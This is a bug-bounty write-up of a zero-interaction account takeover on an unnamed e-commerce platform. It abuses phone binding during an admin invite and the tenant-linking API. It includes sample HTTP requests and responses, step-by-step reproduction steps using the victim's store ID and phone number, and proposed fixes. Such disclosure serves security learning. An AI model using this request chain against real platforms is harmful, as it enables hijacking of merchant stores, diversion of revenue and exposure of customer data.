---
date: 2025-07-12
title: "Zero-Interaction Account Takeover of Any Merchant Store via Tenant Linking Flaw"
template: post
slug: Zero-Interaction-Account-Takeover-of-Any-Merchant-Store-via-Tenant-Linking-Flaw
categories:
  - Technical
tags:
  - bug-bounty

---

What up, fellow hackers and bug bounty hunters! Today, I'm breaking down one of the most severe logic flaws I've ever found: a zero-user-interaction Account Takeover (ATO) that allowed me to gain full administrative control over any merchant's store on a major e-commerce platform. This exploit leveraged publicly available information to bypass the platform's tenant linking security, resulting in a critical €1,500 bounty.

## The Scenario: The Multi-Store Consolidation Feature

The vulnerability lies in a feature designed for convenience. Imagine a merchant who owns three different online stores. Instead of logging into three separate admin dashboards, the platform allows them to **consolidate** all three stores under a single, central admin account. This consolidation, or "tenant linking," relies on the merchant's **phone number** as the primary, trusted identifier to prove ownership of all stores.

I was investigating this tenant linking flow, which uses an API endpoint to associate a store's dashboard with a central admin account. The core vulnerability was found in the API endpoint responsible for connecting an admin account to a store: `/admin/v2/users/accounts/connect`. This endpoint was intended to be a secure process for a legitimate merchant to consolidate their own stores. However, it contained a critical logic flaw in how it validated the phone number and store ID during the linking process, allowing an attacker to link a **victim's** store instead of their own.


## The Vulnerability: Phone Number Binding Bypass

The attack required only two pieces of information, both of which are often publicly accessible:

1.  **The Victim Store ID**: Easily found in the HTTP headers (`Store-Identifier`) of any request made to the victim's public storefront.
2.  **The Victim Store's Phone Number**: Often listed on the store's public contact page or "About Us" section.

The exploit was a chain of steps that tricked the platform into believing the attacker's admin account was authorized to manage the victim's store. The entire attack hinged on exploiting the platform's reliance on the phone number to consolidate stores.

### Step 1: Bind Attacker Account to Victim's Phone

The platform allows an admin to have a phone number associated with their account. The critical flaw was that during the creation of a new admin account (via an invitation flow), I could set the phone number to the **victim's publicly listed phone number**.

The process begins with the attacker inviting a second admin account (controlled by the attacker) to their own store:

**Simulated Request to Invite Second Admin:**
```http
POST /admin/v2/users/invite HTTP/2
Host: api.vulnerable-platform.dev
Authorization: Bearer <ATTACKER_JWT>
Content-Type: application/json

{
  "email": "attacker2@email.com",
  "role": "administrator"
}
```

Crucially, the OTP for verifying this phone number was sent to the attacker's email (since the account was created via email invitation), not to the victim's phone. This bypassed the intended security control, effectively linking the attacker's admin account to the victim's phone number in the backend.

**Simulated Request to Bind Phone (during second admin's profile setup):**
```http
POST /api/v2/users/profile/update HTTP/2
Host: api.vulnerable-platform.dev
Authorization: Bearer <ATTACKER_INVITE_JWT>
Content-Type: application/json

{
  "name": "Attacker Admin",
  "phone": "<VICTIM_PHONE>",
  "password": "SecurePassword123"
}
```
**Simulated Response:**
```json
{
  "status": "success",
  "message": "Profile updated. OTP sent to attacker's email for verification."
}
```

### Step 2: Exploit the Tenant Linking API

With the attacker's second admin account now associated with the victim's phone number, the final step was to use the tenant linking API.

First, I requested an OTP using the compromised admin session:

**Request for OTP:**
```http
POST /admin/v2/otp/send HTTP/2
Host: api.vulnerable-platform.dev
Authorization: Bearer <SECOND_ADMIN_JWT>
S-User-Id: <ATTACKER_USER_ID>
S-Store-Id: <ATTACKER_STORE_ID>
Content-Length: 0
```
**Response:**
```json
{
  "status": "success",
  "message": "OTP sent to associated email/phone."
}
```
I received the `<OTP_CODE>` in my email. Then, I used this OTP along with the **Victim's Store ID** to force the connection:

**Request to Link Victim Store:**
```http
POST /admin/v2/users/accounts/connect HTTP/2
Host: api.vulnerable-platform.dev
Authorization: Bearer <SECOND_ADMIN_JWT>
Content-Type: application/json

{"store_ids":["<VICTIM_STORE_ID>"],"otp_code":"<OTP_CODE>","source":"connect-store"}
```
**Response:**
```json
{
  "status": "success",
  "message": "Stores linked successfully."
}
```
The backend, seeing an admin account (the attacker's) that was associated with the victim's phone number, and receiving a valid OTP, incorrectly authorized the request. The victim's store was instantly linked to the attacker's dashboard.

## The Impact: Critical Merchant Account Takeover

This vulnerability is rated Critical because it results in a complete, zero-user-interaction takeover of any merchant store on the platform.

*   **Full Administrative Control**: The attacker gains full access to the victim's store dashboard, allowing them to:
    *   **Hijack Sales Revenue**: Change bank account details for sales deposits.
    *   **Expose Customer PII**: Access all customer names, addresses, order history, and contact information.
    *   **Sabotage the Business**: Alter store content, delete products, or shut down the business entirely.
*   **Zero User Interaction**: The attack requires no action from the victim merchant or their customers, making it highly scalable and undetectable.
*   **Low Barrier to Entry**: The only prerequisites are two pieces of publicly available information.

## Steps to Reproduce

1.  **Discover Victim Details**: Obtain the `<VICTIM_STORE_ID>` (from storefront headers) and the `<VICTIM_PHONE>` (from the public contact page).
2.  **Create Attacker Admin**: Register a second admin account for the attacker via the invitation flow.
3.  **Bind Phone Number**: During the second admin's profile setup, enter the `<VICTIM_PHONE>` as the account's phone number. Ensure the OTP is delivered to the attacker's email.
4.  **Request OTP**: Using the second admin's session, send a request to `/admin/v2/otp/send` to get a new `<OTP_CODE>`.
5.  **Link Store**: Send a `POST` request to `/admin/v2/users/accounts/connect` using the `<SECOND_ADMIN_JWT>`, the `<VICTIM_STORE_ID>`, and the `<OTP_CODE>`.
6.  **Verify Takeover**: The victim's store dashboard is now linked to the attacker's account, granting full control.

## The Fix

The fix requires a fundamental change in the logic of the tenant linking flow:

1.  **Strict Phone Number Validation**: The platform must ensure that the phone number being used for linking is not only verified but is also **unique** and **owned by the store owner** being linked.
2.  **Two-Factor Authorization**: The tenant linking process should require a strong, non-bypassable second factor of authentication that is sent *only* to the original, trusted store owner's contact information, not to a newly created admin account.
3.  **Store-Specific OTP**: The OTP request in Step 4 should be tied to the store being linked, not just the admin account, and should be sent to the store's primary contact number, not an arbitrary number set during a secondary admin creation.

## Conclusion

This vulnerability is a textbook example of a critical logic flaw where the platform failed to enforce proper authorization during a sensitive account management process. By chaining a weak phone number validation with the tenant linking API, an attacker could completely bypass the security model. It serves as a powerful reminder that security must be enforced at every step of a multi-step process, especially when dealing with merchant accounts and financial data. Happy hacking!
